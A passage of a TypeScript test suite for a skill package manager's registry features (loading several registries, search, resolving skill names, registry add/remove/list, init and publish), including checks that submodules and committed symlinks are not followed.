    expect(argvs.some((a) => a.includes("ls-tree") || a.includes("other/x.git") || a.includes(FAKE))).toBe(false);
  });

  it("the same repository installed as a skill source still opens its submodules (the registry flag is the only difference)", () => {
    // control for the test above: fetchSource without the flag does list the gitlinks
    makeRepo("team/skillrepo", (w) => {
      fs.writeFileSync(path.join(w, "SKILL.md"), "---\nname: s\ndescription: d\n---\nbody\n");
      fs.mkdirSync(path.join(w, "vendor", "x"), { recursive: true });
      git("-C", w, "update-index", "--add", "--cacheinfo", `160000,${FAKE},vendor/x`);
      fs.writeFileSync(path.join(w, ".gitmodules"), '[submodule "vendor/x"]\n\tpath = vendor/x\n\turl = https://git.acme.test/other/x.git\n');
    });
    routeHosts(HOSTS);
    exec.mockClear();
    expect(() => fetchSource(parseSource("git+https://git.acme.test/team/skillrepo.git"))).toThrow();
    expect(exec.mock.calls.some((c) => (c[1] as string[]).includes("ls-tree"))).toBe(true);
  });

  it.skipIf(process.platform === "win32")("several git registries share one time limit, not one each", async () => {
    const bin = path.join(base, "bin");
    fs.mkdirSync(bin);
    fs.writeFileSync(path.join(bin, "git"), "#!/bin/sh\nexec sleep 30\n", { mode: 0o755 });
    process.env.PATH = `${bin}${path.delimiter}${process.env.PATH}`;
    const specs: RegistrySpec[] = [
      { name: "a", location: "git+https://git.acme.test/a/registry.git" },
      { name: "b", location: "git+https://git.acme.test/b/registry.git" },
      { name: "c", location: "git+https://git.acme.test/c/registry.git" },
    ];
    const started = Date.now();
    const r = await loadRegistries(ctx, { only: specs, timeoutMs: 1500 });
    const elapsed = Date.now() - started;
    expect(elapsed).toBeLessThan(3000); // three registries at 1.5 s each would be 4.5 s
    expect(r.every((x) => x.error !== undefined)).toBe(true);
    expect(r[0].error).toMatch(/timed out|time limit/);
    expect(r[2].error).toMatch(/time limit/);
  }, 20_000);
});

// ------------------------------------------------------------------ S2.3 / S2.4 search and add
const loaded = (name: string, ...skills: object[]): LoadedRegistry => ({
  name,
  location: `./${name}.json`,
  scope: "project",
  index: { version: 1, skills: skills as never },
});

describe("S2.3: search rows carry the registry, and keep each registry's own entry", () => {
  it("orders by score, then by registry order, and shows a name two registries share as two rows", () => {
    const a = loaded("a", entry("pdf-extra", "github:a/b/pdf-extra", "extra pdf things"), entry("pdf", "github:a/b/pdf", "pdf tools"));
    const b = loaded("b", entry("pdf", "gitlab:b/c//pdf", "pdf tools, company copy"));
    const hits = searchRegistries([a, b], "pdf");
    expect(hits.map((h) => [h.registry, h.name])).toEqual([["a", "pdf"], ["b", "pdf"], ["a", "pdf-extra"]]);
    expect(hits[0].source).toBe("github:a/b/pdf");
    expect(hits[1].source).toBe("gitlab:b/c//pdf");
  });

  it("a registry that failed to load contributes no rows", () => {
    const broken: LoadedRegistry = { name: "broken", location: "./x", scope: "project", error: "nope" };
    expect(searchRegistries([broken, loaded("a", entry("pdf"))], "pdf").map((h) => h.registry)).toEqual(["a"]);
  });
});

describe("S2.4: add <name> resolves through the registries, in order", () => {
  it("takes the only entry with that name", () => {
    const r = resolveRegistryName([loaded("a", entry("pdf", "github:a/b/pdf")), loaded("b", entry("ocr"))], "ocr");
    expect(r.registry).toBe("b");
    expect(r.entry.source).toBe("github:a/b/ocr");
  });

  it("refuses when two registries list the name, showing both", () => {
    const regs = [loaded("a", entry("pdf", "github:a/b/pdf")), loaded("b", entry("pdf", "gitlab:g/r//pdf"))];
    expect(() => resolveRegistryName(regs, "pdf")).toThrow(
      '"pdf" is listed by a (github:a/b/pdf) and b (gitlab:g/r//pdf); pick one with --from <registry>',
    );
  });

  it("--from picks one registry", () => {
    const regs = [loaded("a", entry("pdf", "github:a/b/pdf")), loaded("b", entry("pdf", "gitlab:g/r//pdf"))];
    expect(resolveRegistryName(regs, "pdf", "b").entry.source).toBe("gitlab:g/r//pdf");
  });

  it("--from with an unknown registry lists the known ones", () => {
    expect(() => resolveRegistryName([loaded("a"), loaded("b")], "pdf", "zzz")).toThrow(/no registry named "zzz"; known: a, b/);
  });

  it("--from a registry that failed to load says why", () => {
    const broken: LoadedRegistry = { name: "broken", location: "./x", scope: "project", error: "Registry index not found at ./x" };
    expect(() => resolveRegistryName([broken], "pdf", "broken")).toThrow(/registry "broken" could not be loaded: Registry index not found/);
  });

  it("--from a registry that does not list the name says so", () => {
    expect(() => resolveRegistryName([loaded("a", entry("ocr"))], "pdf", "a")).toThrow(/"pdf" is not in registry "a"/);
  });

  it("no registry lists it: the error says how to add a local folder", () => {
    expect(() => resolveRegistryName([loaded("a", entry("ocr"))], "pdf")).toThrow(
      "`pdf` is not in any registry; for a local folder use `./pdf`",
    );
  });

  it("names a registry that could not be loaded, since the skill may be in it", () => {
    const broken: LoadedRegistry = { name: "broken", location: "./x", scope: "project", error: "boom" };
    expect(() => resolveRegistryName([broken, loaded("a")], "pdf")).toThrow(/not in any registry.*broken: boom/s);
  });

  it.each([
    ["pdf", true],
    ["release-notes", true],
    ["github:a/b/x", false],
    ["git+https://h.example/r.git", false],
    ["./pdf", false],
    ["../pdf", false],
    ["~/pdf", false],
    ["a/b", false],
    ["Skills", false],
    ["my_skill", false],
    ["C:\\skills", false],
  ])("isRegistryName(%s) is %s", (arg, want) => {
    expect(isRegistryName(arg)).toBe(want);
  });
});

describe("S2.4: addFromRegistry installs what the registry says", () => {
  const alphaRepo = (w: string) => {
    fs.mkdirSync(path.join(w, "alpha"), { recursive: true });
    fs.writeFileSync(path.join(w, "alpha", "SKILL.md"), "---\nname: alpha\ndescription: d\n---\nbody\n");
  };
  beforeEach(() => {
    makeRepo("team/skills", alphaRepo);
    makeRepo("acme/skills", alphaRepo);
    routeHosts(HOSTS);
  });

  it("records the git source, not the name, in the manifest", async () => {
    const idx = writeIndex(path.join(base, "team.json"), entry("alpha", "git+https://git.acme.test/team/skills.git//alpha"));
    writeManifest(proj, { registries: [{ name: "team", location: idx }] });
    const added = await addFromRegistry(ctx, "alpha", {});
    expect(added.map((a) => a.name)).toEqual(["alpha"]);
    const m = JSON.parse(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")) as Manifest;
    expect(m.skills.alpha.source).toBe("git+https://git.acme.test/team/skills.git//alpha");
  });

  it("a registry that failed to load cannot be bypassed: a bare name is refused (the skill may be listed there too), --from goes ahead", async () => {
    const ok = writeIndex(path.join(base, "ok.json"), entry("alpha", "github:acme/skills/alpha"));
    writeManifest(proj, {
      registries: [{ name: "broken", location: path.join(base, "missing.json") }, { name: "ok", location: ok }],
    });
    const warnings: string[] = [];
    await expect(addFromRegistry(ctx, "alpha", { onWarning: (w) => warnings.push(w) })).rejects.toThrow(
      /registry "broken" could not be loaded \(.*Registry index not found.*\), so "alpha" might be listed there too.*--from <registry>/s,
    );
    expect(warnings).toEqual([expect.stringMatching(/registry broken: .*Registry index not found/)]);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    const added = await addFromRegistry(ctx, "alpha", { from: "ok" });
    expect(added.map((a) => a.name)).toEqual(["alpha"]);
  });

  it("refuses a name two registries list, and --from picks one", async () => {
    const one = writeIndex(path.join(base, "one.json"), entry("alpha", "github:acme/skills/alpha"));
    const two = writeIndex(path.join(base, "two.json"), entry("alpha", "git+https://git.acme.test/team/skills.git//alpha"));
    writeManifest(proj, { registries: [{ name: "one", location: one }, { name: "two", location: two }] });
    await expect(addFromRegistry(ctx, "alpha", {})).rejects.toThrow(/"alpha" is listed by one \(github:acme\/skills\/alpha\) and two \(git\+https:\/\/git\.acme\.test\/team\/skills\.git\/\/alpha\); pick one with --from <registry>/);
    expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    await addFromRegistry(ctx, "alpha", { from: "two" });
    const m = JSON.parse(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")) as Manifest;
    expect(m.skills.alpha.source).toBe("git+https://git.acme.test/team/skills.git//alpha");
  });

  describe("Round A D7: a name that is also a folder here is ambiguous", () => {
    const AMBIGUOUS = "ambiguous: `alpha` is a folder here and a registry lookup; use `./alpha` for the folder or `--from <registry> alpha`";

    beforeEach(() => {
      const idx = writeIndex(path.join(base, "team.json"), entry("alpha", "git+https://git.acme.test/team/skills.git//alpha"));
      writeManifest(proj, { registries: [{ name: "team", location: idx }] });
      fs.mkdirSync(path.join(proj, "alpha"));
    });

    it("refuses, before loading any registry, and installs nothing", async () => {
      const fetchSpy = vi.fn(async () => new Response("{}"));
      vi.stubGlobal("fetch", fetchSpy);
      await expect(addFromRegistry(ctx, "alpha", { cwd: proj })).rejects.toThrow(AMBIGUOUS);
      expect(fetchSpy).not.toHaveBeenCalled();
      expect(fs.existsSync(path.join(proj, ".skillwharf"))).toBe(false);
    });

    it("--from says which one is meant, so it goes ahead", async () => {
      const added = await addFromRegistry(ctx, "alpha", { cwd: proj, from: "team" });
      expect(added.map((a) => a.name)).toEqual(["alpha"]);
    });

    it("a file with that name is not a folder: no ambiguity", async () => {
      fs.rmSync(path.join(proj, "alpha"), { recursive: true });
      fs.writeFileSync(path.join(proj, "alpha"), "a file");
      await expect(addFromRegistry(ctx, "alpha", { cwd: proj })).resolves.toHaveLength(1);
    });

    it("Round F: a committed link with that name is ambiguous too, and is never followed", async () => {
      fs.rmSync(path.join(proj, "alpha"), { recursive: true });
      // a link a cloned repository could commit, pointing at a share (here: a path that does not exist)
      fs.symlinkSync("/skillwharf-test-not-there/share", path.join(proj, "alpha"));
      const stat = vi.spyOn(fs, "statSync");
      const exists = vi.spyOn(fs, "existsSync");
      try {
        await expect(addFromRegistry(ctx, "alpha", { cwd: proj })).rejects.toThrow(AMBIGUOUS);
        const target = path.join(proj, "alpha");
        expect(stat.mock.calls.filter((c) => String(c[0]) === target)).toEqual([]);
        expect(exists.mock.calls.filter((c) => String(c[0]) === target)).toEqual([]);
      } finally {
        stat.mockRestore();
        exists.mockRestore();
      }
    });

    it("on the command line too", () => {
      const r = spawnSync(process.execPath, [path.join(repoRoot, "node_modules/tsx/dist/cli.mjs"), path.join(repoRoot, "src/cli.ts"), "add", "alpha"], {
        cwd: proj,
        env: { ...process.env, SKILLWHARF_HOME: home },
        encoding: "utf8",
      });
      expect(r.status).toBe(1);
      expect(r.stderr).toContain(AMBIGUOUS);
    });
  });

  it("does not load a registry when asked for a registry that is not there", async () => {
    writeManifest(proj, { registries: [{ name: "one", location: writeIndex(path.join(base, "one.json"), entry("alpha")) }] });
    await expect(addFromRegistry(ctx, "alpha", { from: "nope" })).rejects.toThrow(/no registry named "nope"; known: one/);
  });
});

// ------------------------------------------------------------------ the command line
describe("search and add on the command line", () => {
  const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
  function cli(args: string[]) {
    const r = spawnSync(process.execPath, [path.join(repo, "node_modules/tsx/dist/cli.mjs"), path.join(repo, "src/cli.ts"), ...args], {
      cwd: proj,
      env: { ...process.env, SKILLWHARF_HOME: home },
      encoding: "utf8",
    });
    return { stdout: r.stdout, stderr: r.stderr, status: r.status };
  }
  let a: string, b: string;
  beforeEach(() => {
    a = writeIndex(path.join(base, "a.json"), entry("pdf", "github:a/b/pdf", "pdf tools"));
    b = writeIndex(path.join(base, "b.json"), entry("pdf", "gitlab:g/r//pdf", "company pdf"));
  });

  it("search --registry <path> still works, with the rows named registry", () => {
    const r = cli(["search", "pdf", "--registry", a, "--json"]);
    expect(r.status).toBe(0);
    const rows = JSON.parse(r.stdout) as { registry: string; name: string }[];
    expect(rows.map((x) => [x.registry, x.name])).toEqual([["registry", "pdf"]]);
  });

  it("search asks every registry the manifest lists, and the JSON rows carry the registry name", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: a }, { name: "company", location: b }] });
    const r = cli(["search", "pdf", "--json"]);
    expect(r.status).toBe(0);
    const rows = JSON.parse(r.stdout) as { registry: string; source: string }[];
    expect(rows.map((x) => [x.registry, x.source])).toEqual([["pub", "github:a/b/pdf"], ["company", "gitlab:g/r//pdf"]]);
  });

  it("the table has a registry column when there is more than one registry", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: a }, { name: "company", location: b }] });
    // eslint-disable-next-line no-control-regex
    const out = cli(["search", "pdf"]).stdout.replace(/\u001b\[[0-9;]*m/g, "");
    expect(out).toMatch(/skill\s+registry\s+description/);
    expect(out).toMatch(/pdf\s+pub\s/);
    expect(out).toMatch(/pdf\s+company\s/);
  });

  it("a registry that fails is reported on stderr by name; the others still answer and stdout stays JSON", () => {
    writeManifest(proj, { registries: [{ name: "broken", location: path.join(base, "missing.json") }, { name: "pub", location: a }] });
    const r = cli(["search", "pdf", "--json"]);
    expect(r.status).toBe(0);
    expect(r.stderr).toMatch(/registry broken: .*Registry index not found/);
    expect((JSON.parse(r.stdout) as unknown[]).length).toBe(1);
  });

  it("search fails when every registry fails", () => {
    writeManifest(proj, { registries: [{ name: "broken", location: path.join(base, "missing.json") }] });
    const r = cli(["search", "pdf"]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/registry broken/);
  });

  it("add --from with a source says --from is for names", () => {
    writeManifest(proj, {});
    const r = cli(["add", "github:a/b/x", "--from", "pub"]);
    expect(r.status).toBe(1);
    expect(r.stderr).toMatch(/--from.*skill name/);
  });

  it("add <name> that no registry lists says how to add a local folder", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: a }] });
    const r = cli(["add", "nothing-here"]);
    expect(r.status).toBe(1);
    expect(r.stderr).toContain("`nothing-here` is not in any registry; for a local folder use `./nothing-here`");
  });
});

// ------------------------------------------------------------------ S2.5 commands
describe("S2.5: registry add, remove and list", () => {
  const manifestText = () => fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8");
  const manifest = () => JSON.parse(manifestText()) as Manifest;
  let team: string, other: string;
  beforeEach(() => {
    team = writeIndex(path.join(proj, "team.json"), entry("one"), entry("two"));
    writeIndex(path.join(proj, "other.json"), entry("three"));
    other = "./other.json"; // a project lists a local registry as a path below it
  });

  it("add loads the index once and appends to the list", async () => {
    writeManifest(proj, { registries: [{ name: "pub", location: other }] });
    const r = await addRegistry(ctx, "team", team);
    expect(r.entries).toBe(2);
    expect(manifest().registries).toEqual([{ name: "pub", location: other }, { name: "team", location: "./team.json" }]);
  });

  it("add with a typo fails and leaves the manifest byte-identical", async () => {
    writeManifest(proj, { registries: [{ name: "pub", location: other }] });
    const before = manifestText();
    await expect(addRegistry(ctx, "typo", path.join(proj, "no-such.json"))).rejects.toThrow(/Registry index not found/);
    expect(manifestText()).toBe(before);
  });

  it("add keeps the public registry when the manifest listed nothing", async () => {
    writeManifest(proj, {});
    await addRegistry(ctx, "team", team);
    expect(manifest().registries).toEqual([{ name: "default", location: "default" }, { name: "team", location: "./team.json" }]);
    expect("registry" in manifest()).toBe(false);
  });

  it("add turns the old registry field into the list", async () => {
    writeManifest(proj, { registry: other });
    await addRegistry(ctx, "team", team);
    expect(manifest().registries).toEqual([{ name: "registry", location: other }, { name: "team", location: "./team.json" }]);
    expect("registry" in manifest()).toBe(false);
  });

  it("add refuses a name that is already listed, and a name that is not a valid name", async () => {
    writeManifest(proj, { registries: [{ name: "team", location: other }] });
    const before = manifestText();
    await expect(addRegistry(ctx, "team", team)).rejects.toThrow(/registry "team" is already listed/);
    await expect(addRegistry(ctx, "Bad Name", team)).rejects.toThrow(/invalid registry name/);
    expect(manifestText()).toBe(before);
  });

  it("add accepts a git location, loaded through the same guards", async () => {
    makeRepo("team/registry", (w) => writeIndex(path.join(w, "index.json"), entry("one")));
    routeHosts(HOSTS);
    writeManifest(proj, {});
    await addRegistry(ctx, "git", "git+https://git.acme.test/team/registry.git");
    expect(manifest().registries?.[1]).toEqual({ name: "git", location: "git+https://git.acme.test/team/registry.git" });
  });

  it("remove drops the named registry", async () => {
    writeManifest(proj, { registries: [{ name: "pub", location: other }, { name: "team", location: "./team.json" }] });
    removeRegistry(ctx, "pub");
    expect(manifest().registries).toEqual([{ name: "team", location: "./team.json" }]);
  });

  it("remove of the last registry leaves an explicit empty list", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: other }] });
    removeRegistry(ctx, "pub");
    expect(manifest().registries).toEqual([]);
    expect(registriesOf(manifest())).toEqual([]);
  });

  it("remove default drops the public registry that was only implied", () => {
    writeManifest(proj, {});
    removeRegistry(ctx, "default");
    expect(manifest().registries).toEqual([]);
  });

  it("remove of the old registry field writes the list without it", () => {
    writeManifest(proj, { registry: other });
    removeRegistry(ctx, "registry");
    expect(manifest().registries).toEqual([]);
    expect("registry" in manifest()).toBe(false);
  });

  it("remove of an unknown name lists the known ones and changes nothing", () => {
    writeManifest(proj, { registries: [{ name: "pub", location: other }] });
    const before = manifestText();
    expect(() => removeRegistry(ctx, "nope")).toThrow(/no registry named "nope"; known: pub/);
    expect(manifestText()).toBe(before);
  });
});

describe("S2.5: registry commands and init on the command line", () => {
  const repo = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
  function cli(args: string[], cwd = proj) {
    const r = spawnSync(process.execPath, [path.join(repo, "node_modules/tsx/dist/cli.mjs"), path.join(repo, "src/cli.ts"), ...args], {
      cwd,
      env: { ...process.env, SKILLWHARF_HOME: home },
      encoding: "utf8",
    });
    return { stdout: r.stdout, stderr: r.stderr, status: r.status };
  }
  // eslint-disable-next-line no-control-regex
  const plain = (s: string) => s.replace(/\u001b\[[0-9;]*m/g, "");
  const manifest = () => JSON.parse(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")) as Manifest;

  it("registry list shows name, location, entry count and loaded, or the error", () => {
    writeIndex(path.join(proj, "good.json"), entry("one"), entry("two"));
    writeManifest(proj, { registries: [{ name: "good", location: "./good.json" }, { name: "broken", location: "./missing.json" }] });
    const r = cli(["registry", "list"]);
    expect(r.status).toBe(0);
    const out = plain(r.stdout);
    expect(out).toMatch(/name\s+location\s+skills\s+status/);
    expect(out).toMatch(/good\s+\.\/good\.json\s+2\s+loaded/);
    expect(out).toMatch(/broken\s+.*missing\.json\s+-\s+Registry index not found/);
  });

  it("registry list --json is plain JSON", () => {
    writeIndex(path.join(proj, "good.json"), entry("one"));
    writeManifest(proj, { registries: [{ name: "good", location: "./good.json" }] });
    const rows = JSON.parse(cli(["--json", "registry", "list"]).stdout) as Record<string, unknown>[];
    expect(rows).toEqual([{ name: "good", location: "./good.json", scope: "project", entries: 1, status: "loaded" }]);
  });

  it("registry add and remove through the command line", () => {
    writeManifest(proj, {});
    writeIndex(path.join(proj, "team.json"), entry("one"));
    const added = cli(["registry", "add", "team", "./team.json"]);
    expect(added.status).toBe(0);
    expect(manifest().registries).toEqual([{ name: "default", location: "default" }, { name: "team", location: "./team.json" }]);
    expect(cli(["registry", "remove", "default"]).status).toBe(0);
    expect(manifest().registries).toEqual([{ name: "team", location: "./team.json" }]);
    const bad = cli(["registry", "add", "typo", "./nope.json"]);
    expect(bad.status).toBe(1);
    expect(bad.stderr).toMatch(/Registry index not found/);
  });

  it("registry add -g writes the global manifest", () => {
    writeManifest(path.join(home, ".skillwharf"), {});
    const idx = writeIndex(path.join(base, "company.json"), entry("one"));
    expect(cli(["-g", "registry", "add", "company", idx]).status).toBe(0);
    const g = JSON.parse(fs.readFileSync(path.join(home, ".skillwharf", "skillwharf.json"), "utf8")) as Manifest;
    expect(g.registries).toEqual([{ name: "default", location: "default" }, { name: "company", location: idx }]);
  });

  it("init --registry <location> writes the 0.1.x field, byte for byte", () => {
    const r = cli(["init", "-a", "claude", "--registry", "https://example.invalid/index.json"]);
    expect(r.status).toBe(0);
    expect(fs.readFileSync(path.join(proj, "skillwharf.json"), "utf8")).toBe(
      JSON.stringify({ version: 1, agents: ["claude"], skills: {}, registry: "https://example.invalid/index.json" }, null, 2) + "\n",
    );
  });

  it("init --registry name=location, repeated, writes the list in order", () => {
    const r = cli(["init", "-a", "claude", "--registry", "pub=https://example.invalid/a.json", "--registry", "team=git+https://git.acme.test/team/registry.git"]);
    expect(r.status).toBe(0);
    const m = manifest();
    expect(m.registries).toEqual([
      { name: "pub", location: "https://example.invalid/a.json" },
      { name: "team", location: "git+https://git.acme.test/team/registry.git" },
    ]);
    expect("registry" in m).toBe(false);
  });

  it("init: a URL with = in it is a location, not name=location", () => {
    cli(["init", "-a", "claude", "--registry", "https://example.invalid/i.json?a=b"]);
    expect(manifest().registry).toBe("https://example.invalid/i.json?a=b");
  });

  it("init refuses two bare registries and a duplicate name", () => {
    expect(cli(["init", "--registry", "https://example.invalid/a.json", "--registry", "https://example.invalid/b.json"]).stderr).toMatch(/name=location/);
    expect(cli(["init", "--registry", "a=./x", "--registry", "a=./y"]).stderr).toMatch(/more than once/);
    expect(fs.existsSync(path.join(proj, "skillwharf.json"))).toBe(false);
  });

  it("publish accepts a source on any git host and refuses a local path", () => {
    const skill = path.join(base, "skill");
    fs.mkdirSync(skill);
    fs.writeFileSync(path.join(skill, "SKILL.md"), "---\nname: mine\ndescription: d\n---\nbody\n");
    const reg = path.join(base, "registry-checkout");
    fs.mkdirSync(reg);
    const ok = cli(["publish", skill, "--registry", reg, "--source", "gitlab:acme/platform/skills//mine"]);
    expect(ok.status).toBe(0);
    expect(JSON.parse(fs.readFileSync(path.join(reg, "index.json"), "utf8")).skills[0].source).toBe("gitlab:acme/platform/skills//mine");
    const bad = cli(["publish", skill, "--registry", reg, "--source", "path:./skill"]);
    expect(bad.status).toBe(1);
    expect(bad.stderr).toMatch(/registry entry must be a git source/);
  });
});
